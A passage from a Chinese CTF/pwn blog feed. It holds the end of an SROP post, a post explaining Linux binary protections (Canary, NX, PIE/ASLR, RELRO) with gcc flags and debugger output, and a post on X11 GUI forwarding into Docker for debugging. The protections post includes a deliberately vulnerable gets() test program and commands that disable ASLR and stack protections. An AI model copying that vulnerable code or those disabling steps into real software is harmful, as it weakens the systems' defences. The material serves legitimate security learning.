Overflow，则该段字节会被破坏，从而在发生<code>sigreturn</code>之前会被检测到。同时针对 Stack Canaries 的攻击也很多，其同样不能从本质上防止 SROP 的发生。</p><h2 id="Break-kernel-agnostic"><a href="#Break-kernel-agnostic" class="headerlink" title="Break kernel agnostic"></a>Break kernel agnostic</h2><p>这就要追溯到 SROP 的本质问题了，就是内核对 Signal 的不可知性。如果我们在内核处理 <code>sigreturn</code> 系统调用的时候判断一下当前的 Signal Frame 是否是由内核之前创建的，那么这个问题就能从根本上解决。当然，这就涉及到要修改内核的一些底层的设计了，可能也会引入一些新的问题。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop</a><br><a href="https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/sigcontext.h" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/sigcontext.h</a><br><a href="https://bestwing.me/stack-overflow-three-SROP.html" target="_blank" rel="noopener">https://bestwing.me/stack-overflow-three-SROP.html</a><br><a href="http://blog.leanote.com/post/3191220142@qq.com/SROP" target="_blank" rel="noopener">http://blog.leanote.com/post/3191220142@qq.com/SROP</a><br><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/87447.html</a><br><a href="http://blog.eonew.cn/archives/975" target="_blank" rel="noopener">http://blog.eonew.cn/archives/975</a><br><a href="https://bestwing.me/2017-360chunqiu-online.html" target="_blank" rel="noopener">https://bestwing.me/2017-360chunqiu-online.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去年学 ROP 的时候遗漏的一个技术。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux下的各类程序保护机制</title>
    <link href="blog.b3ale.cn/2020/03/06/Linux%E4%B8%8B%E7%9A%84%E5%90%84%E7%B1%BB%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <id>blog.b3ale.cn/2020/03/06/Linux%E4%B8%8B%E7%9A%84%E5%90%84%E7%B1%BB%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</id>
    <published>2020-03-06T10:59:35.000Z</published>
    <updated>2020-03-20T02:07:20.057Z</updated>
    
    <content type="html"><![CDATA[<p>之前一直在做逆向，快一年没碰 PWN 了，接下来有一堆比赛，赶紧重新 PWN 起来。这里先整理一下 Linux 下的程序保护机制。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>Linux 版本：</p><pre><code class="bash">$ uname -aLinux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</code></pre><p>GCC 版本：</p><pre><code class="bash">$ gcc --versiongcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609Copyright (C) 2015 Free Software Foundation, Inc.This is free software; see the source for copying conditions.  There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</code></pre><h1 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h1><p><a href="https://github.com/slimm609/checksec.sh/" target="_blank" rel="noopener">Checksec</a> 是用 Shell 编写的一个脚本，它可以用来检查可执行文件属性，例如 PIE, RELRO, PaX, Canaries, ASLR, Fortify Source 等等属性。</p><p><img src="/pics/Linux下的各类程序保护机制/1.png" srcset="/img/loading.gif" alt></p><h1 id="Cannary"><a href="#Cannary" class="headerlink" title="Cannary"></a>Cannary</h1><p>Canary 表示栈保护功能是否开启。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 Shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入 Cookie 信息，当函数真正返回的时候会验证 Cookie 信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将 Cookie 信息给覆盖掉，导致栈保护检查失败而阻止 Shellcode 的执行。在 Linux 中将 Cookie 信息称为 Canary。</p><p>gcc 在 4.2 版本中添加了 <code>-fstack-protector</code> 和 <code>-fstack-protector-all</code> 编译参数以支持栈保护功能，4.9 新增了 <code>-fstack-protector-strong</code> 编译参数让保护的范围更广。故在编译时可以控制是否开启栈保护以及程度。</p><p>测试代码：</p><pre><code class="cpp">#include &lt;stdio.h&gt;int main() {    char buf[20];    gets(buf);    return 0;}</code></pre><h2 id="Default（-fstack-protector）"><a href="#Default（-fstack-protector）" class="headerlink" title="Default（-fstack-protector）"></a>Default（<code>-fstack-protector</code>）</h2><p>默认情况下，开启了 Cannary 保护（即 <code>-fstack-protector</code> 参数），一开始会在栈上存储 Cannary（<code>QWORD PTR fs:0x28</code>），在程序结束时通过异或检查栈上的值是否正确来检查 Cannary 是否被篡改，如果不正确则调用 <code>__stack_chk_fail()</code> 产生报错：</p><pre><code class="asm">0000000000400596 &lt;main&gt;:  400596:    55                       push   rbp  400597:    48 89 e5                 mov    rbp,rsp  40059a:    48 83 ec 20              sub    rsp,0x20  40059e:    64 48 8b 04 25 28 00     mov    rax,QWORD PTR fs:0x28  4005a5:    00 00  4005a7:    48 89 45 f8              mov    QWORD PTR [rbp-0x8],rax  4005ab:    31 c0                    xor    eax,eax  4005ad:    48 8d 45 e0              lea    rax,[rbp-0x20]  4005b1:    48 89 c7                 mov    rdi,rax  4005b4:    b8 00 00 00 00           mov    eax,0x0  4005b9:    e8 c2 fe ff ff           call   400480 &lt;gets@plt&gt;  4005be:    b8 00 00 00 00           mov    eax,0x0  4005c3:    48 8b 55 f8              mov    rdx,QWORD PTR [rbp-0x8]  4005c7:    64 48 33 14 25 28 00     xor    rdx,QWORD PTR fs:0x28  4005ce:    00 00  4005d0:    74 05                    je     4005d7 &lt;main+0x41&gt;  4005d2:    e8 89 fe ff ff           call   400460 &lt;__stack_chk_fail@plt&gt;  4005d7:    c9                       leave  4005d8:    c3                       ret</code></pre><h2 id="fno-stack-protector"><a href="#fno-stack-protector" class="headerlink" title="-fno-stack-protector"></a><code>-fno-stack-protector</code></h2><p><code>-fstack-protector</code> 参数取消对栈的保护，直接编译成程序所对应的汇编：</p><pre><code class="asm">0000000000400526 &lt;main&gt;:  400526:    55                       push   rbp  400527:    48 89 e5                 mov    rbp,rsp  40052a:    48 83 ec 20              sub    rsp,0x20  40052e:    48 8d 45 e0              lea    rax,[rbp-0x20]  400532:    48 89 c7                 mov    rdi,rax  400535:    b8 00 00 00 00           mov    eax,0x0  40053a:    e8 d1 fe ff ff           call   400410 &lt;gets@plt&gt;  40053f:    b8 00 00 00 00           mov    eax,0x0  400544:    c9                       leave  400545:    c3                       ret</code></pre><h1 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h1><p>NX 即 No-eXecute（不可执行）的意思，NX（即 Windows 下的 DEP，数据执行保护）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 Shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。</p><h2 id="Default（-z-noexecstack）"><a href="#Default（-z-noexecstack）" class="headerlink" title="Default（-z noexecstack）"></a>Default（<code>-z noexecstack</code>）</h2><p>默认开始 NX，栈上的数据不可执行：</p><pre><code class="gdb">assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r--p    /home/beale/Test_Dir/main0x00601000         0x00602000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h2 id="z-execstack"><a href="#z-execstack" class="headerlink" title="-z execstack"></a><code>-z execstack</code></h2><p>开启栈可执行后，栈上的代码可被执行，同时其他处内存部分都是读写执行全开：</p><pre><code class="gdb">assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r-xp    /home/beale/Test_Dir/main0x00601000         0x00602000         rwxp    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rwxp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rwxp    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rwxp    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rwxp    mapped0x00007ffffffde000 0x00007ffffffff000 rwxp    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h1 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h1><p>一般情况下 NX 和地址空间分布随机化（ASLR）会同时工作。<a href="https://blog.csdn.net/spenghui/article/details/79910884" target="_blank" rel="noopener">ASLR 不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责；但是只有在开启 ASLR 之后，PIE 才会生效。</a>内存地址随机化机制（Address Space Layout Randomization)，有以下三种情况（具体的 ASLR 和 PIE 的互相作用：<a href="https://www.cnblogs.com/rec0rd/p/7646857.html）：" target="_blank" rel="noopener">https://www.cnblogs.com/rec0rd/p/7646857.html）：</a></p><ol><li>0 - 表示关闭进程地址空间随机化。</li><li>1 - 表示将 mmap 的基址，stack 和 Vdso 页面随机化。</li><li>2 - 表示在 1 的基础上增加 heap 的随机化。</li></ol><p>可以防范基于 ret2libc 方式的针对 DEP 的攻击。ASLR 和 DEP 配合使用，能有效阻止攻击者在堆栈上运行恶意代码。位置独立的可执行区域（Position-Independent Executables）使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（Return-Oriented Programming）方法变得难得多。</p><blockquote><p>Linux 关闭 PIE 的方法：</p><pre><code class="bash">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></pre></blockquote><h2 id="Default（-no-pie）"><a href="#Default（-no-pie）" class="headerlink" title="Default（-no-pie）"></a>Default（<code>-no-pie</code>）</h2><p>默认不开启。静态分析程序时所得到的地址都是运行时的真实地址，基地址为 0x400000：</p><pre><code class="asm">0000000000400526 &lt;main&gt;:  400526:    55                       push   rbp  400527:    48 89 e5                 mov    rbp,rsp  40052a:    bf c4 05 40 00           mov    edi,0x4005c4  40052f:    e8 cc fe ff ff           call   400400 &lt;puts@plt&gt;  400534:    b8 00 00 00 00           mov    eax,0x0  400539:    5d                       pop    rbp  40053a:    c3                       ret</code></pre><p>与 gdb 调试的时候相同：</p><pre><code class="gdb">───────────────────────────────────── Code ─────────────────────────────────────   0x400521 &lt;frame_dummy+33&gt;:    jmp    0x4004a0 &lt;register_tm_clones&gt;   0x400526 &lt;main&gt;:    push   rbp   0x400527 &lt;main+1&gt;:    mov    rbp,rsp=&gt; 0x40052a &lt;main+4&gt;:    mov    edi,0x4005c4   0x40052f &lt;main+9&gt;:    call   0x400400 &lt;puts@plt&gt;   0x400534 &lt;main+14&gt;:    mov    eax,0x0   0x400539 &lt;main+19&gt;:    pop    rbp   0x40053a &lt;main+20&gt;:    ret</code></pre><h2 id="pie"><a href="#pie" class="headerlink" title="-pie"></a><code>-pie</code></h2><p><code>-fpie</code> 与 <code>-fPIE</code> 效果一样，用于编译；<code>-pie</code> 用于链接。开启 PIE 后的静态反编译结果没有基地址，每次运行时的基地址不同：</p><pre><code class="asm">0000000000000750 &lt;main&gt;: 750:    55                       push   rbp 751:    48 89 e5                 mov    rbp,rsp 754:    48 8d 3d 99 00 00 00     lea    rdi,[rip+0x99]        # 7f4 &lt;_IO_stdin_used+0x4&gt; 75b:    e8 90 fe ff ff           call   5f0 &lt;puts@plt&gt; 760:    b8 00 00 00 00           mov    eax,0x0 765:    5d                       pop    rbp 766:    c3                       ret</code></pre><p>gdb 调试时如下：</p><pre><code class="gdb">───────────────────────────────────── Code ─────────────────────────────────────   0x55555555474b &lt;frame_dummy+43&gt;:    jmp    0x555555554690 &lt;register_tm_clones&gt;   0x555555554750 &lt;main&gt;:    push   rbp   0x555555554751 &lt;main+1&gt;:    mov    rbp,rsp=&gt; 0x555555554754 &lt;main+4&gt;:    lea    rdi,[rip+0x99]        # 0x5555555547f4   0x55555555475b &lt;main+11&gt;:    call   0x5555555545f0 &lt;puts@plt&gt;   0x555555554760 &lt;main+16&gt;:    mov    eax,0x0   0x555555554765 &lt;main+21&gt;:    pop    rbp   0x555555554766 &lt;main+22&gt;:    ret[rip+0x99] : 0x5555555547f4 (&quot;Hello World&quot;)</code></pre><h1 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h1><p>在 Linux 系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处。GCC、GNU linker 以及 Glibc-dynamic linker 一起配合实现了一种叫做 relro（Read Only Relocation）的技术。大概实现就是由 linker 指定程序的一块经过 dynamic linker 处理过 relocation 之后的区域为只读.</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT 攻击。RELRO 为 Partial RELRO，说明对 GOT 表具有写权限。</p><h2 id="Default（-z-lazy）"><a href="#Default（-z-lazy）" class="headerlink" title="Default（-z lazy）"></a>Default（<code>-z lazy</code>）</h2><p>默认情况下对 GOT 表具有写权限。可以看到 <code>puts</code> 和 <code>_libc_start_main</code> 所在的内存部分是可写的：</p><pre><code class="gdb">assassinq$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : Partialassassinq$ got/home/beale/Test_Dir/main:     file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET           TYPE              VALUE0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.50000000000601020 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r--p    /home/beale/Test_Dir/main0x00601000         0x00602000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h2 id="z-norelro"><a href="#z-norelro" class="headerlink" title="-z norelro"></a><code>-z norelro</code></h2><p>没有开启 RELRO 的情况：</p><pre><code class="gdb">assassinq$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : disabledassassinq$ got/home/beale/Test_Dir/main:     file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET           TYPE              VALUE00000000006008a8 R_X86_64_GLOB_DAT  __gmon_start__00000000006008c8 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.500000000006008d0 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h2 id="z-now"><a href="#z-now" class="headerlink" title="-z now"></a><code>-z now</code></h2><p>此时无法修改 GOT 表。<code>puts</code> 和 <code>_libc_start_main</code> 所在的内存部分只有读权限：</p><pre><code class="gdb">assassinq$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : FULLassassinq$ got/home/beale/Test_Dir/main:     file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET           TYPE              VALUE0000000000600fe8 R_X86_64_GLOB_DAT  puts@GLIBC_2.2.50000000000600ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.50000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r--p    /home/beale/Test_Dir/main0x00601000         0x00602000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>各种安全选择的编译参数如下：</p><ul><li>NX：<code>-z execstack</code> / <code>-z noexecstack</code> (关闭 / 开启)</li><li>Canary：<code>-fno-stack-protector</code> / <code>-fstack-protector</code> / <code>-fstack-protector-all</code> (关闭 / 开启 / 全开启)</li><li>PIE：<code>-no-pie</code> / <code>-pie</code> (关闭 / 开启)</li><li>RELRO：<code>-z norelro</code> / <code>-z lazy</code> / <code>-z now</code> (关闭 / 部分开启 / 完全开启)</li></ul><p><img src="/pics/Linux下的各类程序保护机制/2.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://www.gandalf.site/2019/03/linux-pwn.html" target="_blank" rel="noopener">http://www.gandalf.site/2019/03/linux-pwn.html</a><br><a href="https://stackoverflow.com/questions/24465014/gcc-generate-canary-or-not" target="_blank" rel="noopener">https://stackoverflow.com/questions/24465014/gcc-generate-canary-or-not</a><br><a href="https://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ld" target="_blank" rel="noopener">https://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ld</a><br><a href="https://richardustc.github.io/2013-05-21-2013-05-21-pie.html" target="_blank" rel="noopener">https://richardustc.github.io/2013-05-21-2013-05-21-pie.html</a><br><a href="http://liudonghua.com/archives/2014/10/26/gcc_g++%E4%B8%AD%E7%9A%84pic%E4%B8%8Epie/" target="_blank" rel="noopener">http://liudonghua.com/archives/2014/10/26/gcc_g++%E4%B8%AD%E7%9A%84pic%E4%B8%8Epie/</a><br><a href="https://paper.seebug.org/481/" target="_blank" rel="noopener">https://paper.seebug.org/481/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前一直在做逆向，快一年没碰 PWN 了，接下来有一堆比赛，赶紧重新 PWN 起来。这里先整理一下 Linux 下的程序保护机制。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>使用X11在macOS上获得更好的体验</title>
    <link href="blog.b3ale.cn/2020/03/05/%E4%BD%BF%E7%94%A8X11%E5%9C%A8macOS%E4%B8%8A%E8%8E%B7%E5%BE%97%E6%9B%B4%E5%A5%BD%E7%9A%84%E4%BD%93%E9%AA%8C/"/>
    <id>blog.b3ale.cn/2020/03/05/%E4%BD%BF%E7%94%A8X11%E5%9C%A8macOS%E4%B8%8A%E8%8E%B7%E5%BE%97%E6%9B%B4%E5%A5%BD%E7%9A%84%E4%BD%93%E9%AA%8C/</id>
    <published>2020-03-05T01:05:31.000Z</published>
    <updated>2020-03-20T02:27:12.156Z</updated>
    
    <content type="html"><![CDATA[<p>X11 也叫做 X Window 系统，X Window 系统（X11 或 X）是一种位图显示的视窗系统。它是在 Unix 和 类 Unix 操作系统，以及 OpenVMS 上建立图形用户界面的标准工具包和协议，并可用于几乎所有已有的现代操作系统。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>使用 Homebrew 下载 XQuartz：</p><pre><code class="bash">brew cask install xquartz</code></pre><p>打开 XQuartz 并设置如下：</p><pre><code class="bash">open -a XQuartz</code></pre><p><img src="/pics/使用X11在macOS上获得更好的体验/1.png" srcset="/img/loading.gif" alt></p><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p><code>ssh</code> 命令中加上 <code>-X</code> 参数，可以打开远程的 GUI 界面：</p><pre><code class="bash">$ ssh -X beale@192.168.2.190beale@192.168.2.190&#39;s password:Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage700 packages can be updated.452 updates are security updates.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.$ firefox</code></pre><p><img src="/pics/使用X11在macOS上获得更好的体验/2.png" srcset="/img/loading.gif" alt></p><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>Docker 现在已经是一个配置环境的利器，缺点就是只有 CLI，但可以通过 X11 在 Docker 中开启 GUI。首先需要获取本机 IP 地址，并添加到 X11 Server 的列表中：</p><pre><code class="bash">$ IP=$(ifconfig en0 | grep inet | awk &#39;$1==&quot;inet&quot; {print $2}&#39;)$ echo $IP$ xhost + $IP</code></pre><p>通过参数 <code>-e</code> 覆盖容器内的环境变量 <code>DISPLAY=$IP:0</code>，并用 <code>-v</code> 参数挂载本地 <code>/tmp/.X11-unix</code> 到容器内部的同一位置，利用 Docker Hub 中提供的一个 Firefox 的镜像来启动装有 Firefox 浏览器的容器：</p><pre><code class="bash">docker run -d --name firefox -e DISPLAY=$IP:0 -v /tmp/.X11-unix:/tmp/.X11-unix jess/firefox</code></pre><p><img src="/pics/使用X11在macOS上获得更好的体验/3.png" srcset="/img/loading.gif" alt></p><h2 id="Upgrade"><a href="#Upgrade" class="headerlink" title="Upgrade"></a>Upgrade</h2><p>在 Docker 中使用 GDB 调试一般采用 tmux 来解决窗口的问题，很久之前看了 Swings 大佬的博客，发现了用 X11 来实现 GDB 弹窗的方法，这种感觉想想就爽。这里 XQuartz 主要作为一个新终端的承载器和 host 机器和 Docker 的通讯器。</p><p>和上面同理也是先获取 IP，再做一个环境变量的覆盖和 X11 文件的挂载，这里用我的镜像启动：</p><pre><code class="bash">docker run -it --rm --privileged -e DISPLAY=$IP:0 -v &quot;/tmp/.X11-unix:/tmp/.X11-unix&quot; -v &quot;$PWD:/root/tmp&quot; assassinq/pwn-machine-16.04:v8 /bin/bash</code></pre><p>然后终端需要设置一下字体的编码，测试的时候发现不改变编码弹窗的时候会发生乱码的情况：</p><pre><code class="bash">export LANG=C.UTF-8</code></pre><p>同时，弹窗的终端使用的是 lxterminal，一个比较轻量级的终端。exp 里终端设置如下：</p><pre><code class="python">context.terminal = [&quot;lxterminal&quot;, &quot;-e&quot;]</code></pre><p>接下来就可以开始愉快地调试了：</p><p><img src="/pics/使用X11在macOS上获得更好的体验/4.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://blog.csdn.net/hdzhang_blog/article/details/80058559" target="_blank" rel="noopener">https://blog.csdn.net/hdzhang_blog/article/details/80058559</a><br><a href="https://bestwing.me/Docker-for-Mac-and-run-gdb-GUI-window.html" target="_blank" rel="noopener">https://bestwing.me/Docker-for-Mac-and-run-gdb-GUI-window.html</a><br><a href="http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html" target="_blank" rel="noopener">http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html</a><br><a href="https://sourabhbajaj.com/blog/2017/02/07/gui-applications-docker-mac/" target="_blank" rel="noopener">https://sourabhbajaj.com/blog/2017/02/07/gui-applications-docker-mac/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;X11 也叫做 X Window 系统，X Window 系统（X11 或 X）是一种位图显示的视窗系统。它是在 Unix 和 类 Unix 操作系统，以及 OpenVMS 上建立图形用户界面的标准工具包和协议，并可用于几乎所有已有的现代操作系统。&lt;/p&gt;
    
    </summary>
    
    
    
